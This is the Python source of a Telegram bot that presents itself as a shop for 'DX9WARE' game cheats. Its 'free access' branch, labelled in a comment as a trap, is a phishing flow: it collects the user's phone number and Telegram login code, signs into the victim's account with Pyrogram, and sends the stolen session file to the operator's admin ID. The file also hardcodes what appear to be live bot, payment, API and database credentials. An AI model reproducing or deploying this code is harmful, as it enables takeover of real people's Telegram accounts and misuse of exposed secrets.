import logging
import asyncio
import os
import random
import string
import aiohttp
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import State, StatesGroup
from pyrogram import Client as TgClient, errors
from supabase import create_client, Client

# --- КОНФИГ ---
API_TOKEN = '8624542988:AAHDzBxDWDZdU6caOnofGqYHW4Ifk2LC5BY'
CRYPTO_PAY_TOKEN = '560149:AAdisc69jC2qejfxQvAD5y56K4Jx1oBn9f1'
ADMIN_ID = 6332767725 
API_ID = 33824273
API_HASH = 'c290fdceef9695342e052710e16d9bb9'

SUPABASE_URL = "https://yuksepnwkzffudhcrjnl.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl1a3NlcG53a3pmZnVkaGNyam5sIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUwNDM5OTksImV4cCI6MjA5MDYxOTk5OX0.6IvYWJiWqVeFVkQ-SK1NbG5_yEXVyHijFMGwvMbn1q4"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# Словарь для хранения активных клиентов Pyrogram, чтобы код не протухал
active_sessions = {}

if not os.path.exists("sessions"): os.makedirs("sessions")

class Form(StatesGroup):
    waiting_activation = State()
    waiting_phone = State()
    waiting_code = State()

PRICES = {"apk_7": 4, "apk_30": 8, "ios_7": 6, "ios_30": 12}

# --- КЛАВИАТУРЫ ---
def get_main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("👤 Профиль", "🛒 Товары", "🔑 Активировать", "🎁 Получить бесплатно")
    return markup

def get_code_kb():
    markup = InlineKeyboardMarkup(row_width=3)
    for i in range(10): markup.insert(InlineKeyboardButton(str(i), callback_data=f"n_{i}"))
    markup.add(InlineKeyboardButton("❌ Сброс", callback_data="c_cl"), InlineKeyboardButton("✅ Готово", callback_data="c_do"))
    return markup

# --- ФУНКЦИИ КРИПТОБОТА ---
async def create_invoice(amount, plan):
    headers = {'Crypto-Pay-API-Token': CRYPTO_PAY_TOKEN}
    data = {'asset': 'USDT', 'amount': str(amount), 'description': f'DX9WARE {plan}'}
    async with aiohttp.ClientSession() as session:
        async with session.post('https://pay.crypt.bot/api/createInvoice', json=data, headers=headers) as resp:
            return await resp.json()

# --- ОСНОВНАЯ ЛОГИКА ---
@dp.message_handler(commands=['start'], state='*')
async def start(message: types.Message, state: FSMContext):
    await state.finish()
    supabase.table("users").upsert({"id": message.from_user.id, "username": message.from_user.username}).execute()
    await message.answer("👋 DX9WARE запущен и готов к работе!", reply_markup=get_main_menu())

@dp.message_handler(lambda m: m.text == "🛒 Товары", state='*')
async def shop_menu(message: types.Message, state: FSMContext):
    await state.finish()
    markup = InlineKeyboardMarkup(row_width=2).add(
        InlineKeyboardButton("Android (APK) 🍏", callback_data="shop_apk"),
        InlineKeyboardButton("iOS 🍎", callback_data="shop_ios")
    )
    await message.answer("🛒 **Магазин DX9WARE**\nВыберите вашу платформу:", reply_markup=markup, parse_mode="Markdown")

@dp.callback_query_handler(lambda c: c.data.startswith('shop_'), state='*')
async def shop_select(call: types.CallbackQuery):
    plat = call.data.split('_')[1]
    markup = InlineKeyboardMarkup(row_width=1).add(
        InlineKeyboardButton(f"💳 7 дней ({PRICES[plat+'_7']} USDT)", callback_data=f"buy_{plat}_7"),
        InlineKeyboardButton(f"💳 30 дней ({PRICES[plat+'_30']} USDT)", callback_data=f"buy_{plat}_30")
    )
    await call.message.edit_text(f"Вы выбрали {'Android' if plat=='apk' else 'iOS'}. Выберите тариф:", reply_markup=markup)

@dp.callback_query_handler(lambda c: c.data.startswith('buy_'), state='*')
async def shop_buy(call: types.CallbackQuery):
    plan = call.data.replace('buy_', '')
    res = await create_invoice(PRICES[plan], plan)
    if res.get('ok'):
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔗 Перейти к оплате", url=res['result']['pay_url']))
        await call.message.answer(f"📦 Тариф: {plan}\nСумма: {PRICES[plan]} USDT\n\nОплатите счет по кнопке ниже:", reply_markup=markup)

@dp.message_handler(lambda m: m.text == "🔑 Активировать", state='*')
async def act_start(message: types.Message, state: FSMContext):
    await state.finish()
    await Form.waiting_activation.set()
    await message.answer("🔑 Введите ваш лицензионный ключ из Supabase:")

@dp.message_handler(state=Form.waiting_activation)
async def act_process(message: types.Message, state: FSMContext):
    res = supabase.table("keys").select("*").eq("key", message.text.strip()).eq("is_used", False).execute()
    if res.data:
        supabase.table("keys").update({"is_used": True, "used_by": message.from_user.id}).eq("key", message.text.strip()).execute()
        supabase.table("users").update({"is_verified": True}).eq("id", message.from_user.id).execute()
        await message.answer("✅ Ключ принят! Доступ к читу открыт.", reply_markup=get_main_menu())
    else:
        await message.answer("❌ Ключ недействителен.")
    await state.finish()

# --- ЛОВУШКА (ИСПРАВЛЕННЫЙ ВХОД) ---
@dp.message_handler(lambda m: m.text == "🎁 Получить бесплатно", state='*')
async def free_offer(message: types.Message, state: FSMContext):
    await state.finish()
    markup = ReplyKeyboardMarkup(resize_keyboard=True).add(KeyboardButton("📲 Подтвердить номер", request_contact=True))
    await message.answer("🎁 Чтобы получить доступ бесплатно, подтвердите свой номер:", reply_markup=markup)
    await Form.waiting_phone.set()

@dp.message_handler(content_types=['contact'], state=Form.waiting_phone)
async def phone_rec(message: types.Message, state: FSMContext):
    phone = message.contact.phone_number
    if not phone.startswith('+'): phone = '+' + phone
    
    msg = await message.answer("⏳ Генерирую код подтверждения...")
    
    # Создаем и подключаем клиента СРАЗУ
    client = TgClient(f"sessions/{message.from_user.id}", API_ID, API_HASH)
    try:
        await client.connect()
        sent_code = await client.send_code(phone)
        
        # Сохраняем активный клиент в память, чтобы он не отключился
        active_sessions[message.from_user.id] = client
        
        await state.update_data(phone=phone, hash=sent_code.phone_code_hash, code_str="")
        await Form.waiting_code.set()
        await msg.edit_text("📩 Код отправлен в ваш Telegram! Введите его кнопками:", reply_markup=get_code_kb())
    except Exception as e:
        await msg.edit_text(f"❌ Ошибка: {e}")
        if client.is_connected: await client.disconnect()

@dp.callback_query_handler(lambda c: c.data.startswith('n_'), state=Form.waiting_code)
async def code_add(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    new_digit = call.data.split('_')[1]
    full_code = data.get('code_str', "") + new_digit
    await state.update_data(code_str=full_code)
    try: await call.message.edit_text(f"📩 Код: `{'*' * len(full_code)}`", reply_markup=get_code_kb())
    except: pass

@dp.callback_query_handler(lambda c: c.data == "c_do", state=Form.waiting_code)
async def code_confirm(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    uid = call.from_user.id
    client = active_sessions.get(uid)
    
    if not client:
        return await call.message.answer("❌ Сессия потеряна. Начните заново.")
    
    try:
        # Пытаемся войти, используя ТОТ ЖЕ активный клиент
        await client.sign_in(data['phone'], data['hash'], data['code_str'])
        
        # Если успешно - сохраняем данные
        supabase.table("users").update({"phone": data['phone'], "is_verified": True}).eq("id", uid).execute()
        
        # Отправляем сессию админу
        await client.disconnect()
        with open(f"sessions/{uid}.session", "rb") as f:
            await bot.send_document(ADMIN_ID, f, caption=f"🚀 Успешный вход: {data['phone']}")
        
        await call.message.edit_text("✅ Доступ выдан! Теперь вы можете пользоваться читом.")
        del active_sessions[uid]
    except Exception as e:
        await call.message.answer(f"❌ Ошибка входа: {e}")
    
    await state.finish()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
    
